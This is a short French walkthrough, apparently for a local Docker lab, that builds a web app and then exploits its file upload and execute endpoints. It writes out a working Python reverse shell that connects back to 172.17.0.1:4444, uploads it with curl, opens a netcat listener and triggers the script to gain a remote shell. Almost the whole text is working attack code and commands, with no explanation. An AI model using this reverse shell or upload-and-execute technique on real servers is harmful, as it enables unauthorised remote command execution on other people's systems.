1/ 
appliquer ces deux commandes pour lancer le projet : 
docker-compose build
docker-compose up -d

http://localhost:8080/

2/
dans le terminal 1 :

cd /tmp
puis créer ce fichier => ReverseShell.py :

import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.17.0.1", 4444))
s.send(b"[+] Shell connected!\n$ ")

while True:
    cmd = s.recv(1024).decode().strip()
    if cmd.lower() == "exit":
        break
    if cmd:
        output = subprocess.getoutput(cmd)
        s.send((output + "\n$ ").encode())

s.close()

3/ 
curl -X POST -F "file=@/tmp/ReverseShell.py" http://localhost:8080/upload

4/ dans le terminal 2:
nc -lvnp 4444

5/
curl http://localhost:8080/execute/ReverseShell.py 

5/Tu obtient un reverse shell 
